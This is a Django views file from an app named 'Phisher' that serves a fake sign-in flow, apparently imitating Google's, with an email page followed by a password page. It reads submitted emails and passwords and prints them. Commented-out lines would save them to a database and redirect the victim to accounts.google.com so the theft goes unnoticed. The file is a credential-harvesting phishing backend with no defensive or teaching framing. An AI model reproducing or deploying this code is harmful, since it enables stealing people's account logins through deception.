from Phisher.models import SignIn
from django.shortcuts import render, HttpResponsePermanentRedirect
from datetime import datetime


def index(request):
    return render(request, 'index.html')


def signin(request):
    print(request.POST)
    if request.method == 'POST':
        email = request.POST.get('email', None)
        password = request.POST.get('password', None)
        print(email, password)
        if email and password:
            # SignIn(email=str(email).strip(), password=str(password).strip(), date_time=datetime.now()).save()
            # return HttpResponsePermanentRedirect('https://accounts.google.com')

            pass
        elif email:        
            return render(request, 'passwd.html',{'email' : email})

    # for deployment
    return index(request)
    

def error(request):
    return render(request, '400.html')
